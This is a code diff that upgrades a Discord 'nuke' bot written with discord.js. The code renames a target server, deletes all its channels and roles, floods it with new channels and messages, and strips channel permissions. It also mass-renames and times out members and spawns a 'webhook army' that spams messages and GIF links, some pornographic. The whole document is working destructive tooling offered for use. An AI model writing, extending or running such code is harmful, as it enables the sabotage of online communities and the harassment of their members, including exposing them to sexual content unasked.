@@ -17,8 +17,8 @@ const TOKEN = process.env.TOKEN;
 const TARGET_GUILD_ID = process.env.TARGET_GUILD_ID || null;
 const PROTECTED_CHANNEL = 'aaaaaaaa';
 
-const NUKE_DURATION = 10 * 60 * 1000; // 10 minutes
-const TICK_INTERVAL = 7 * 1000;       // faster ticks
+const NUKE_DURATION = 10 * 60 * 1000;
+const TICK_INTERVAL = 7 * 1000;
 let nukeActive = false;
 let nukeTimeout = null;
 let currentPhase = 1;
@@ -32,13 +32,13 @@ const GIF_TYPE_2 = [
   "https://klipy.com/gifs/vegan-porn-carrot-porn"
 ];
 
-// ================== HUGE LISTS ==================
+// ================== LISTS ==================
 const SERVER_NAMES = [
   'NUKED', 'HALLUCINATION', 'SERVER DEAD', 'OWNED', 'RIP', 'GET FUCKED',
   'NO SURVIVORS', 'BOT WON', 'DESTROYED', 'GOODBYE', 'MINIONS ACTIVE',
   'REALITY BROKEN', 'CHAOS OVERLOAD', '10 MIN NUKE', 'TOTAL COLLAPSE',
-  'FINAL STAGE', 'NO ESCAPE', 'MINION ARMY', 'PHASE 2', 'PHASE 3',
-  'PURE CHAOS', 'MUTE HELL', 'ROLE HELL', 'CHANNEL FLOOD', 'ENDGAME'
+  'FINAL STAGE', 'NO ESCAPE', 'MINION ARMY', 'WEBHOOK ARMY', 'ARMY ONLINE',
+  'BOSS UPGRADED', 'OVERLORD MODE', 'FULL PRESSURE'
 ];
 
 const CHANNEL_NAMES = [
@@ -46,46 +46,43 @@ const CHANNEL_NAMES = [
   'pain', 'end', 'lmao', 'gg', 'bot-was-here', 'no-escape', 'server-corpse',
   'extreme-nuke', 'minion-zone', 'hallucination', 'glitch', 'error', 'deleted',
   'why', 'mute-zone', 'screaming', 'help', 'pain-chamber', 'final',
-  'minion-spam', 'boss-room', 'collapse', 'broken', 'phase-2', 'phase-3',
-  'flood', 'spam', 'kill', 'die', 'cry', 'run', 'hide', 'nope', 'end-me'
+  'minion-spam', 'boss-room', 'collapse', 'broken', 'army', 'flood', 'wave',
+  'boss-flood', 'overlord', 'pressure', 'kill-zone'
 ];
 
 const NICKNAMES = [
   'NUKED', 'OWNED', 'RIP', 'GET FUCKED', 'BOT PROPERTY', 'NO HOPE',
   'DESTROYED', 'SERVER CORPSE', 'VICTIM', 'MINION FOOD', 'MUTED',
-  'SILENCED', 'BROKEN', '10 MIN VICTIM', 'CHAOS SLAVE', 'PHASE VICTIM',
-  'ROLELESS', 'LOST', 'HELPLESS', 'TARGET', 'MARKED', 'DOOMED'
+  'SILENCED', 'BROKEN', 'ARMY TARGET', 'WEBHOOK VICTIM', 'BOSS TARGET',
+  'OVERLORD VICTIM', 'PRESSURED'
 ];
 
 const ROLE_NAMES = [
   'Nuked', 'Owned', 'Destroyed', 'RIP', 'Bot Property', 'No Hope', 'Minion',
-  'Glitch', 'Muted', 'Silenced', 'Chaos', 'Victim', 'Phase 2', 'Phase 3',
-  'Doomed', 'Marked', 'Slave', 'Target', 'Broken', 'Flooded'
+  'Glitch', 'Muted', 'Silenced', 'Chaos', 'Victim', 'Army', 'Flooded',
+  'Boss Marked', 'Overlord', 'Pressure', 'Doomed'
 ];
 
 const MESSAGES = [
-  '**10 MINUTE NUKE ACTIVE**', 'SERVER IS DEAD', 'GET FUCKED', 'NO SURVIVORS',
+  '**WEBHOOK ARMY ONLINE**', 'SERVER IS DEAD', 'GET FUCKED', 'NO SURVIVORS',
   'OWNED', 'THE END', 'RIP SERVER', 'YOU CANNOT STOP THIS', 'BOT WINS',
-  'GOODBYE', 'MINIONS ARE HELPING', 'REALITY IS BREAKING', 'TOO FAST',
-  'MUTED', 'SILENCE', '10 MINUTES OF PAIN', 'NO ESCAPE', 'MINION ARMY ONLINE',
-  'BOSS IS ANGRY', 'COLLAPSE IMMINENT', 'PHASE CHANGE', 'IT GETS WORSE',
-  'CHANNEL FLOOD', 'ROLE HELL', 'MUTE HELL', 'YOU ARE NOTHING'
+  'GOODBYE', 'MINIONS ARE HELPING', 'ARMY INCOMING', 'TOO MANY WEBHOOKS',
+  'MUTED', 'SILENCE', '10 MINUTES OF PAIN', 'NO ESCAPE', 'ARMY OVERWHELM',
+  'BOSS UPGRADED', 'FULL PRESSURE', 'OVERLORD MODE', 'FEEL THE BOSS'
 ];
 
-const MINION_NAMES = [
-  'Minion', 'Minion-2', 'Chaos Helper', 'Glitch', 'Slave', 'Destroyer',
-  'Spammer', 'Mute Bot', 'Pain', 'Void', 'Phase Drone', 'Flood', 'Screamer',
-  'Null', 'Error', 'Ghost', 'Hunter', 'Breaker'
+const ARMY_NAMES = [
+  'Minion', 'Army-1', 'Army-2', 'Flood', 'Screamer', 'Null', 'Hunter',
+  'Breaker', 'Spammer', 'Ghost', 'Drone', 'Wave', 'Chaos', 'Destroyer',
+  'Pain', 'Void', 'Error', 'Slave', 'Glitch', 'Overlord'
 ];
 
-const MINION_MESSAGES = [
-  'minion reporting', 'chaos incoming', 'you are done', 'boss ordered this',
-  'no survivors', 'mute activated', 'gif spam', 'reality break', '10 min nuke',
-  'help the boss', 'phase shift', 'flooding channels', 'role destruction',
-  'silence them', 'break everything', 'no hope left', 'we are many'
+const ARMY_MESSAGES = [
+  'army reporting', 'wave incoming', 'you are done', 'boss ordered this',
+  'no survivors', 'mute activated', 'gif spam', 'reality break',
+  'webhook army', 'too many of us', 'flooding now', 'phase shift',
+  'we are many', 'no hope', 'collapse', 'army online', 'boss is stronger'
 ];
-
-const PHASE_NAMES = ['PHASE 1: CHAOS', 'PHASE 2: FLOOD', 'PHASE 3: SILENCE', 'PHASE 4: COLLAPSE'];
 
 // ================== HELPERS ==================
 function randomItem(arr) {
@@ -108,7 +105,7 @@ async function getOrCreateWebhook(channel, name = 'Minion') {
     if (!webhook) {
       webhook = await channel.createWebhook({
         name: name,
-        reason: 'Chaos Minion',
+        reason: 'Webhook Army',
       });
     }
     return webhook;
@@ -119,24 +116,27 @@ async function getOrCreateWebhook(channel, name = 'Minion') {
 
 async function safeDelete(channel) {
   if (!channel || channel.name === PROTECTED_CHANNEL) return;
-  await channel.delete('10 MIN NUKE').catch(() => {});
+  await channel.delete('WEBHOOK ARMY NUKE').catch(() => {});
 }
 
-// ================== BOSS ACTIONS (EXPANDED) ==================
+// ================== UPGRADED BOSS ACTIONS ==================
 const bossActions = [
+  // Server rename
   async (guild) => {
     await guild.setName(randomItem(SERVER_NAMES)).catch(() => {});
     console.log('🔥 Boss renamed server');
   },
 
+  // Mass channel delete
   async (guild) => {
     const channels = [...guild.channels.cache.values()];
     for (const channel of channels) await safeDelete(channel);
     console.log('🗑️ Boss mass deleted channels');
   },
 
+  // Heavy channel flood
   async (guild) => {
-    for (let i = 0; i < 9; i++) {
+    for (let i = 0; i < 10; i++) {
       try {
         const ch = await guild.channels.create({
           name: randomItem(CHANNEL_NAMES),
@@ -145,41 +145,45 @@ const bossActions = [
         await ch.send(randomItem(MESSAGES)).catch(() => {});
       } catch (e) {}
     }
-    console.log('✨ Boss flooded channels');
+    console.log('✨ Boss heavy channel flood');
   },
 
+  // Create + quick delete (pressure)
   async (guild) => {
     for (let i = 0; i < 6; i++) {
       try {
         const ch = await guild.channels.create({
-          name: randomItem(['temp', 'flash', 'glitch', 'deleted', 'error', 'null']),
+          name: randomItem(['temp', 'flash', 'glitch', 'army', 'wave', 'pressure']),
           type: ChannelType.GuildText,
         });
-        await ch.send('👁').catch(() => {});
-        setTimeout(() => ch.delete().catch(() => {}), 3000 + Math.random() * 5000);
+        await ch.send('👁 BOSS').catch(() => {});
+        setTimeout(() => ch.delete().catch(() => {}), 3500 + Math.random() * 4000);
       } catch (e) {}
     }
   },
 
+  // Delete all roles
   async (guild) => {
     const roles = [...guild.roles.cache.values()];
     for (const role of roles) {
       if (role.id === guild.id || !role.editable) continue;
-      await role.delete('10 MIN NUKE').catch(() => {});
+      await role.delete('BOSS UPGRADE').catch(() => {});
     }
     console.log('🗑️ Boss deleted roles');
   },
 
+  // Create many roles
   async (guild) => {
-    for (let i = 0; i < 8; i++) {
+    for (let i = 0; i < 9; i++) {
       await guild.roles.create({
         name: randomItem(ROLE_NAMES),
         color: randomItem([Colors.Red, Colors.DarkRed, Colors.Purple, Colors.Orange, Colors.Fuchsia]),
-        reason: '10 MIN NUKE',
+        reason: 'BOSS UPGRADE',
       }).catch(() => {});
     }
   },
 
+  // Nickname hell
   async (guild) => {
     const members = await guild.members.fetch().catch(() => null);
     if (!members) return;
@@ -190,17 +194,19 @@ const bossActions = [
     console.log('👤 Boss nickname hell');
   },
 
+  // Mute hell (upgraded)
   async (guild) => {
     const members = await guild.members.fetch().catch(() => null);
     if (!members) return;
     for (const member of members.values()) {
       if (member.user.bot || !member.moderatable) continue;
-      const time = [120, 300, 600, 900, 1800, 3600, 7200][Math.floor(Math.random() * 7)] * 1000;
-      await member.timeout(time, '10 MIN NUKE - MUTED').catch(() => {});
+      const time = [300, 600, 900, 1800, 3600, 7200][Math.floor(Math.random() * 6)] * 1000;
+      await member.timeout(time, 'BOSS UPGRADE - MUTED').catch(() => {});
     }
     console.log('⏳ Boss mute hell');
   },
 
+  // Message spam
   async (guild) => {
     const channels = guild.channels.cache.filter(c =>
       c.type === ChannelType.GuildText &&
@@ -213,41 +219,45 @@ const bossActions = [
     }
   },
 
+  // Permission destruction
   async (guild) => {
     const channels = guild.channels.cache.filter(c => c.manageable);
     for (const channel of channels.values()) {
       await channel.permissionOverwrites.edit(guild.roles.everyone, {
-        ViewChannel: chance(25),
+        ViewChannel: chance(15),
         SendMessages: false,
         Connect: false,
         Speak: false,
         AddReactions: false,
         AttachFiles: false,
+        EmbedLinks: false,
       }).catch(() => {});
     }
     console.log('🔐 Boss permission destruction');
   },
 
+  // Boss nickname
   async (guild) => {
     await guild.members.me.setNickname(randomItem([
-      '10 MIN NUKE', 'HALLUCINATION', 'MINION BOSS', 'REALITY BREAKER',
-      'THE DESTROYER', 'MUTE MASTER', 'CHAOS GOD', 'PHASE CONTROLLER'
+      'WEBHOOK ARMY', 'ARMY COMMANDER', 'MINION BOSS', 'NUKE BOSS',
+      'OVERLORD', 'BOSS UPGRADED', 'FULL PRESSURE', 'THE DESTROYER'
     ])).catch(() => {});
   },
 
+  // Category chaos
   async (guild) => {
     for (let i = 0; i < 4; i++) {
       try {
         const cat = await guild.channels.create({
-          name: randomItem(['NUKE ZONE', 'MINION ARMY', 'VOID', 'PAIN', 'FINAL', 'PHASE']),
+          name: randomItem(['BOSS ZONE', 'ARMY BASE', 'PRESSURE', 'VOID', 'OVERLORD', 'FINAL']),
           type: ChannelType.GuildCategory,
         });
-        setTimeout(() => cat.delete().catch(() => {}), 12000 + Math.random() * 15000);
+        setTimeout(() => cat.delete().catch(() => {}), 10000 + Math.random() * 15000);
       } catch (e) {}
     }
   },
 
-  // New: Role assign hell
+  // Role assign hell (new)
   async (guild) => {
     const members = await guild.members.fetch().catch(() => null);
     const roles = [...guild.roles.cache.filter(r => r.editable && r.id !== guild.id).values()];
@@ -260,32 +270,43 @@ const bossActions = [
     }
     console.log('🎭 Boss role assign hell');
   },
+
+  // Double pressure: nickname + mute
+  async (guild) => {
+    const members = await guild.members.fetch().catch(() => null);
+    if (!members) return;
+    for (const member of members.values()) {
+      if (member.user.bot) continue;
+      if (member.manageable) await member.setNickname(randomItem(NICKNAMES)).catch(() => {});
+      if (member.moderatable) {
+        await member.timeout(600000, 'BOSS DOUBLE PRESSURE').catch(() => {});
+      }
+    }
+    console.log('💀 Boss double pressure');
+  },
 ];
 
-// ================== MINION ACTIONS (EXPANDED) ==================
-const minionActions = [
+// ================== WEBHOOK ARMY SYSTEM ==================
+const armyActions = [
   async (guild) => {
     const channels = guild.channels.cache.filter(c =>
       c.type === ChannelType.GuildText &&
       c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
     );
-
     for (const channel of channels.values()) {
-      for (const name of MINION_NAMES.slice(0, 6)) {
+      for (const name of ARMY_NAMES.slice(0, 8)) {
         const webhook = await getOrCreateWebhook(channel, name);
         if (!webhook) continue;
-
-        for (let i = 0; i < 4; i++) {
+        for (let i = 0; i < 3; i++) {
           const gif = Math.random() < 0.5 ? randomItem(GIF_TYPE_1) : randomItem(GIF_TYPE_2);
-          if (gif) {
-            await webhook.send({ content: gif, username: name }).catch(() => {});
-          } else {
-            await webhook.send({ content: randomItem(MINION_MESSAGES), username: name }).catch(() => {});
-          }
+          await webhook.send({
+            content: gif || randomItem(ARMY_MESSAGES),
+            username: name,
+          }).catch(() => {});
         }
       }
     }
-    console.log('👾 Minions heavy GIF spam');
+    console.log('👾 WEBHOOK ARMY GIF WAVE');
   },
 
   async (guild) => {
@@ -293,36 +314,40 @@ const minionActions = [
       c.type === ChannelType.GuildText &&
       c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
     );
-
     for (const channel of channels.values()) {
-      const webhook = await getOrCreateWebhook(channel, randomItem(MINION_NAMES));
-      if (!webhook) continue;
-
-      for (let i = 0; i < 7; i++) {
+      for (let i = 0; i < 5; i++) {
+        const webhook = await getOrCreateWebhook(channel, randomItem(ARMY_NAMES));
+        if (!webhook) continue;
         await webhook.send({
-          content: randomItem(MINION_MESSAGES),
-          username: randomItem(MINION_NAMES),
+          content: randomItem(ARMY_MESSAGES),
+          username: randomItem(ARMY_NAMES),
         }).catch(() => {});
       }
     }
+    console.log('👾 WEBHOOK ARMY TEXT FLOOD');
   },
 
   async (guild) => {
     for (let i = 0; i < 4; i++) {
       try {
         const ch = await guild.channels.create({
-          name: randomItem(['minion-spam', 'minion-zone', 'help-boss', 'chaos', 'flood']),
+          name: randomItem(['army-spam', 'wave', 'flood-zone', 'minion-army', 'webhook-hell']),
           type: ChannelType.GuildText,
         });
-        const webhook = await getOrCreateWebhook(ch, 'Minion');
-        if (webhook) {
-          for (let j = 0; j < 5; j++) {
+        for (const name of ARMY_NAMES.slice(0, 4)) {
+          const webhook = await getOrCreateWebhook(ch, name);
+          if (!webhook) continue;
+          for (let j = 0; j < 3; j++) {
             const gif = Math.random() < 0.5 ? randomItem(GIF_TYPE_1) : randomItem(GIF_TYPE_2);
-            await webhook.send({ content: gif || randomItem(MINION_MESSAGES), username: 'Minion' }).catch(() => {});
+            await webhook.send({
+              content: gif || randomItem(ARMY_MESSAGES),
+              username: name,
+            }).catch(() => {});
           }
         }
       } catch (e) {}
     }
+    console.log('👾 ARMY CREATED SPAM CHANNELS');
   },
 
   async (guild) => {
@@ -331,75 +356,62 @@ const minionActions = [
       const webhook = await getOrCreateWebhook(channel, 'Glitch');
       if (!webhook) continue;
       await webhook.send({
-        content: randomItem(['👁', '💀', '🔥', '⚠️', '☠️', '💥', '🌀', '❌']),
-        username: 'Glitch',
+        content: randomItem(['👁', '💀', '🔥', '⚠️', '☠️', '💥', '🌀', '❌', '🩸', '⚔️']),
+        username: randomItem(['Glitch', 'Null', 'Error', 'Void']),
       }).catch(() => {});
     }
   },
 
-  // New minion: confusion spam
   async (guild) => {
     const channels = guild.channels.cache.filter(c =>
       c.type === ChannelType.GuildText &&
       c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
     );
-
     for (const channel of channels.values()) {
-      const webhook = await getOrCreateWebhook(channel, 'Null');
+      const webhook = await getOrCreateWebhook(channel, 'Hunter');
       if (!webhook) continue;
       await webhook.send({
         content: randomItem([
-          'ERROR 0x000', 'REALITY.DLL FAILED', 'SYSTEM COLLAPSE',
-          'MINION OVERFLOW', 'PHASE SHIFT DETECTED', 'NULL POINTER',
-          'YOU ARE NOT SAFE', 'SIGNAL LOST'
+          'ARMY WAVE INCOMING',
+          'TOO MANY WEBHOOKS',
+          'YOU CANNOT STOP THE ARMY',
+          'PHASE OVERLOAD',
+          'WEBHOOK ARMY ACTIVE',
+          'MINIONS EVERYWHERE',
+          'BOSS IS STRONGER NOW'
         ]),
-        username: 'Null',
+        username: 'Hunter',
       }).catch(() => {});
     }
   },
 ];
 
-// ================== PHASE SYSTEM ==================
-function updatePhase(elapsed) {
-  if (elapsed < 150000) currentPhase = 1;
-  else if (elapsed < 300000) currentPhase = 2;
-  else if (elapsed < 450000) currentPhase = 3;
-  else currentPhase = 4;
-}
-
-// ================== MAIN NUKE TICK ==================
-async function runNukeTick(guild, startTime) {
+// ================== MAIN TICK ==================
+async function runNukeTick(guild) {
   if (!guild || !guild.members.me.permissions.has(PermissionFlagsBits.Administrator)) {
     console.log('⚠️ Missing Administrator permission');
     return;
   }
 
-  const elapsed = Date.now() - startTime;
-  updatePhase(elapsed);
+  console.log(`\n======== WEBHOOK ARMY + UPGRADED BOSS TICK on ${guild.name} ========`);
 
-  console.log(`\n======== ${PHASE_NAMES[currentPhase - 1]} | Tick on ${guild.name} ========`);
-
-  // More actions in later phases
-  const bossCount = currentPhase === 1 ? 7 : currentPhase === 2 ? 9 : currentPhase === 3 ? 10 : 12;
-  const minionCount = currentPhase === 1 ? 2 : currentPhase === 2 ? 3 : 4;
-
-  const selectedBoss = [...bossActions].sort(() => 0.5 - Math.random()).slice(0, bossCount);
+  const selectedBoss = [...bossActions].sort(() => 0.5 - Math.random()).slice(0, 9);
   for (const action of selectedBoss) {
     try {
       await action(guild);
       await sleep(90);
     } catch (err) {
-      console.error('❌ Boss error:', err.message);
+      console.error('❌ Boss:', err.message);
     }
   }
 
-  const selectedMinions = [...minionActions].sort(() => 0.5 - Math.random()).slice(0, minionCount);
-  for (const action of selectedMinions) {
+  const selectedArmy = [...armyActions].sort(() => 0.5 - Math.random()).slice(0, 4);
+  for (const action of selectedArmy) {
     try {
       await action(guild);
       await sleep(80);
     } catch (err) {
-      console.error('❌ Minion error:', err.message);
+      console.error('❌ Army:', err.message);
     }
   }
 }
@@ -407,42 +419,33 @@ async function runNukeTick(guild, startTime) {
 // ================== START / STOP ==================
 async function startNuke(guild, message) {
   if (nukeActive) {
-    if (message) await message.reply('⚠️ Nuke is already running.');
+    if (message) await message.reply('⚠️ Nuke already running.');
     return;
   }
 
   nukeActive = true;
-  currentPhase = 1;
-  const startTime = Date.now();
+  if (message) await message.reply('💣 **WEBHOOK ARMY + UPGRADED BOSS NUKE STARTED**');
 
-  if (message) {
-    await message.reply('💣 **10 MINUTE EXTREME NUKE STARTED**\nPhases will escalate.\nMinions + Boss are online.');
-  }
+  console.log('💣 WEBHOOK ARMY + UPGRADED BOSS NUKE STARTED');
 
-  console.log('💣 10 MINUTE EXTREME NUKE SESSION STARTED');
-
-  await runNukeTick(guild, startTime);
+  await runNukeTick(guild);
 
   const interval = setInterval(async () => {
-    if (!nukeActive) {
-      clearInterval(interval);
-      return;
-    }
-    await runNukeTick(guild, startTime);
+    if (!nukeActive) return clearInterval(interval);
+    await runNukeTick(guild);
   }, TICK_INTERVAL);
 
   nukeTimeout = setTimeout(() => {
     nukeActive = false;
     clearInterval(interval);
-    console.log('🛑 10 MINUTE NUKE SESSION ENDED');
+    console.log('🛑 NUKE ENDED');
   }, NUKE_DURATION);
 }
 
 // ================== EVENTS ==================
 client.once('ready', () => {
   console.log(`✅ Logged in as ${client.user.tag}`);
-  console.log(`💣 EXTREME 10 MIN NUKE BOT READY`);
-  console.log(`Protected channel: ${PROTECTED_CHANNEL}`);
+  console.log(`💣 WEBHOOK ARMY + UPGRADED BOSS READY`);
 });
 
 client.on('messageCreate', async (message) => {
@@ -456,12 +459,7 @@ client.on('messageCreate', async (message) => {
   if (message.content === '!nuke-stop') {
     nukeActive = false;
     if (nukeTimeout) clearTimeout(nukeTimeout);
-    await message.reply('🛑 Nuke session force stopped.');
-    console.log('🛑 Nuke force stopped');
-  }
-
-  if (message.content === '!phase') {
-    await message.reply(`Current Phase: **${PHASE_NAMES[currentPhase - 1] || 'IDLE'}**`);
+    await message.reply('🛑 Nuke stopped.');
   }
 });
 
